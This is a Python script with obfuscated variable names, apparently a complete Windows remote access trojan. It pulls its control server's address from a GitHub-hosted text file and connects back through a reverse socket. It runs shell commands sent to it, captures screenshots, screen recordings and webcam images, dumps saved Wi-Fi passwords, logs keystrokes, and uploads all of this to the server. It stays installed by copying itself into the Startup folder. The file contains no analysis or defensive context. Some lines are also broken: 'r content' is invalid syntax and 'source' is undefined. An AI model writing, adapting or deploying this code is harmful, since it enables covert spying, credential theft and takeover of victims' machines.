import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
RMvecVjsm = ""
lcnxijmaxBZpuZKZngl = ""
cUUHEbBpnHrcvnzgWnwLxY = "01.06.26.0"
lCEHHiVqgGvAfhINHslGhN = True
zTwrDEFeBn = "!"
zRhyyWAzPDRyqzKrhOU = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
YqJBwZXPWfAkzglOif = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
bRjcqUXwRnDeSR = os.path.expanduser("~\\AppData\\Local\\")
ILVWnEkMyqEeGU = os.path.expanduser("~\\AppData\\Roaming\\")
ciXFfixBfYmiHJ = ""
def nEsOBLdIxApibEeeyW(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def HCtSwCPWHYtYQCXNdrib(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	hqtIuNUgVvNwF = data.decode("utf-8").replace("\n","")
	if not hqtIuNUgVvNwF.startswith(zTwrDEFeBn):
		proc = subprocess.run(hqtIuNUgVvNwF, shell=True, capture_output=True)
		AXgkSGGzVaSqnrfDZ = proc.stdout + proc.stderr
		rrnEIYXoUbbu(s, AXgkSGGzVaSqnrfDZ)
		return
	TYwMPrdHvm = hqtIuNUgVvNwF.split(" ")[0][1:]
	args = " ".join(hqtIuNUgVvNwF.split()[1:]).split()
	if TYwMPrdHvm == "cd":
		moveDirectory(s, hqtIuNUgVvNwF[4:])
	elif TYwMPrdHvm == "screenshot":
		WzomKOYMHh(s)
	elif TYwMPrdHvm == "webcam":
		ahqKXZUbW(s, args)
	elif TYwMPrdHvm == "download":
		iRtgAEENyppHzSe(s, hqtIuNUgVvNwF)
	elif TYwMPrdHvm == "upload":
		LvulznNkEjBuH(s, hqtIuNUgVvNwF)
	elif TYwMPrdHvm == "wifi":
		pADdeeLrGtGCt(s)
	elif TYwMPrdHvm == "screenrecord":
		sjcCuMCobZrgtehACc(s, args)
	elif TYwMPrdHvm == "update":
		wjFbWDXkubXtI(s)
	elif TYwMPrdHvm == "basename":
		rrnEIYXoUbbu(s, os.path.basename(__file__))
	else:
		rrnEIYXoUbbu(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		rrnEIYXoUbbu(s,"")
	except:
		rrnEIYXoUbbu(s, "[!] 404")
def iRtgAEENyppHzSe(s, hqtIuNUgVvNwF):
	RjniyDWutIxjHfomYRWIt = hqtIuNUgVvNwF.replace(zTwrDEFeBn+"download ","").split(",")
	AXgkSGGzVaSqnrfDZs = ""
	for f in RjniyDWutIxjHfomYRWIt:
		AXgkSGGzVaSqnrfDZs += GgMNNlqFidFi(f, "api/file/", { "type":os.path.splitext(f)[1] })
	rrnEIYXoUbbu(s, AXgkSGGzVaSqnrfDZs)
def WzomKOYMHh(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	byXLMGYWMFOeJS = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(byXLMGYWMFOeJS)
	image.close()
	AXgkSGGzVaSqnrfDZ = GgMNNlqFidFi(byXLMGYWMFOeJS, "api/sscap")
	os.remove(byXLMGYWMFOeJS)
	rrnEIYXoUbbu(s, AXgkSGGzVaSqnrfDZ)
def ahqKXZUbW(s, args):
	import cv2
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(bRjcqUXwRnDeSR+fname, frame)
		cam.release()
		r=GgMNNlqFidFi(bRjcqUXwRnDeSR+fname,"api/wc")
		os.remove(bRjcqUXwRnDeSR+fname)
		rrnEIYXoUbbu(s, r)
	except Exception as e:
		rrnEIYXoUbbu(s, "[!] 404: "+str(e))
def sjcCuMCobZrgtehACc(s, args):
	import imageio
	from PIL import ImageGrab
	QLhDbjXNmfxeGPLwcRVq = 15
	if not args == []:
		try: QLhDbjXNmfxeGPLwcRVq = int(args[0])
		except: pass
	aUEJzUTBALdOT = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	LMyUqTOiIjqh = []
	fps = 11
	numFrames = QLhDbjXNmfxeGPLwcRVq * fps
	for _ in range(numFrames):
		LMyUqTOiIjqh.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(aUEJzUTBALdOT, LMyUqTOiIjqh, fps=fps, quality=8)
	r=GgMNNlqFidFi(aUEJzUTBALdOT, "api/screc")
	os.remove(aUEJzUTBALdOT)
	rrnEIYXoUbbu(s, r)
def GgMNNlqFidFi(whNRMND, cQMIhkvBADWa, yZMroSf=None):
	import requests
	if not os.path.isfile(whNRMND):
		return "[!] 404: "+whNRMND+"\n"
	headers = {"user":os.getlogin()}
	if yZMroSf is not None:
		headers = {**headers, **yZMroSf}
	f = open(whNRMND, "rb")
	requests.post("http://"+RMvecVjsm+":5555/"+cQMIhkvBADWa,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def LvulznNkEjBuH(s, hqtIuNUgVvNwF):
	import requests
	gkalChCoMp = hqtIuNUgVvNwF.split(" ")[-1]
	aspwFvqciqNlSyP = hqtIuNUgVvNwF.replace(zTwrDEFeBn+"upload ","").replace(" "+gkalChCoMp,"")
	if os.path.exists(aspwFvqciqNlSyP) or os.path.isfile(aspwFvqciqNlSyP):
		rrnEIYXoUbbu(s, "[!] 409")
		return
	response = requests.get(f"http://{RMvecVjsm}:5555/api/content/{gkalChCoMp}", headers={"auth":"981xyz"})
	if response.status_code != 200:
		rrnEIYXoUbbu(s, "[!] 404")
		return
	with open(aspwFvqciqNlSyP, "wb") as f:
		f.write(response.content)
	rrnEIYXoUbbu(s, "[+] 200")
def IIAzRBiuoRuzXgfKMM(DjHshANEXemohyOhkq, cQMIhkvBADWa):
	import requests
	if DjHshANEXemohyOhkq.strip() == "":
		return "[!] 204"
	requests.post("http://"+RMvecVjsm+":5555/"+cQMIhkvBADWa,
		data=DjHshANEXemohyOhkq,
		headers={"user":os.getlogin()})
	return "[+] 200"
def wjFbWDXkubXtI(s):
	h, p, v = fOCsLZpoJFoXHfiX(True)
	if (v != cUUHEbBpnHrcvnzgWnwLxY):
		LkNSJMG(v)
		rrnEIYXoUbbu(s, "[+] 200")
	else:
		rrnEIYXoUbbu(s, "[-] 304")
def pADdeeLrGtGCt(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		rrnEIYXoUbbu(s, "[!] 500")
		return
	QupJcrXINQQh = ""
	for p in profiles:
		try: QupJcrXINQQh+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: QupJcrXINQQh+=f"    {p} - N/A"
	rrnEIYXoUbbu(s, QupJcrXINQQh)
def LkNSJMG(QYcZrtmYpFYvwSGIKBXYPRq):
	import requests, sys
	global lCEHHiVqgGvAfhINHslGhN
	name, ext = os.path.splitext(os.path.basename(sys.executable if getattr(sys, "frozen", False) else __file__))
	py = ext.startswith(".py")
	file = f"{name}.{QYcZrtmYpFYvwSGIKBXYPRq}.{'pyw' if py else 'exe'}"
	course = f"file.{'pyw' if py else 'exe'}"
	path = os.path.join(os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"), file)
	if not os.path.isfile(path):
		r = requests.get(YqJBwZXPWfAkzglOif + source)
		with open(path, "w" if py else "wb") as f:
			f.write(r.text if py else r content)
	else:
		lCEHHiVqgGvAfhINHslGhN = False
def fOCsLZpoJFoXHfiX(force=False):
	global RMvecVjsm, lcnxijmaxBZpuZKZngl
	if force or RMvecVjsm == "" or lcnxijmaxBZpuZKZngl == "":
		while True:
			try:
				with urllib.request.urlopen(zRhyyWAzPDRyqzKrhOU) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					RMvecVjsm = data[0].strip()
					lcnxijmaxBZpuZKZngl = data[1].strip()
					QYcZrtmYpFYvwSGIKBXYPRq = data[2].strip()
					return RMvecVjsm, lcnxijmaxBZpuZKZngl, QYcZrtmYpFYvwSGIKBXYPRq
			except:
				time.sleep(10)
def czBhSwwW():
	try:
		pPeXloFfMAyKF = "settings.xpb"
		YpojHtPcxpVHbDOGeTH = sorted([file for file in os.listdir(bRjcqUXwRnDeSR) if os.path.isfile(bRjcqUXwRnDeSR+"\\"+file) and file.endswith(pPeXloFfMAyKF.split(".")[-1])])
		if pPeXloFfMAyKF in YpojHtPcxpVHbDOGeTH:
			YpojHtPcxpVHbDOGeTH.remove(pPeXloFfMAyKF)
		CqUjUjiPWpgATC = os.path.join(bRjcqUXwRnDeSR,pPeXloFfMAyKF)
		if len(YpojHtPcxpVHbDOGeTH) > 0:
			with open(CqUjUjiPWpgATC, "ab+") as f:
				for file in YpojHtPcxpVHbDOGeTH:
					temp = os.path.join(bRjcqUXwRnDeSR,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		GgMNNlqFidFi(CqUjUjiPWpgATC, "api/log")
		if os.path.isfile(CqUjUjiPWpgATC):
			os.remove(CqUjUjiPWpgATC)
	except:
		pass
def uIszTPVAp():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(bRjcqUXwRnDeSR+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def SBklTQwlmgNjXGGF(k):
		logging.info(str(k))
	k=Listener(on_press=SBklTQwlmgNjXGGF)
	KjOFgJcnSTqBRHdS = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in KjOFgJcnSTqBRHdS:
		l.setLevel(logging.CRITICAL)
	k.start()
def rrnEIYXoUbbu(clientSocket, DjHshANEXemohyOhkq):
	formattedData = b""
	if type(DjHshANEXemohyOhkq) == bytes:
		formattedData += DjHshANEXemohyOhkq
	else:
		formattedData += bytes(DjHshANEXemohyOhkq, "utf-8")
	formattedData += bytes("\n"+ciXFfixBfYmiHJ+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def HhTadHqfLEKfiEOXYKAAFcZ():
	global ciXFfixBfYmiHJ
	h, p, v = fOCsLZpoJFoXHfiX()
	try: czBhSwwW()
	except: pass
	try:
		if cUUHEbBpnHrcvnzgWnwLxY != v:
			LkNSJMG(v)
	except: pass
	try:
		if lCEHHiVqgGvAfhINHslGhN:
			uIszTPVAp()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	ciXFfixBfYmiHJ = ("(old)"if cUUHEbBpnHrcvnzgWnwLxY!=v else "")+"["+cUUHEbBpnHrcvnzgWnwLxY+"] "+os.getlogin()+" - "
	while True:
		kcFWzwAjHBgs=False
		try:
			s=nEsOBLdIxApibEeeyW(h, p)
			rrnEIYXoUbbu(s, "")
			while not kcFWzwAjHBgs:
				try: kcFWzwAjHBgs=HCtSwCPWHYtYQCXNdrib(s)
				except Exception as e:
					rrnEIYXoUbbu(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
HhTadHqfLEKfiEOXYKAAFcZ()
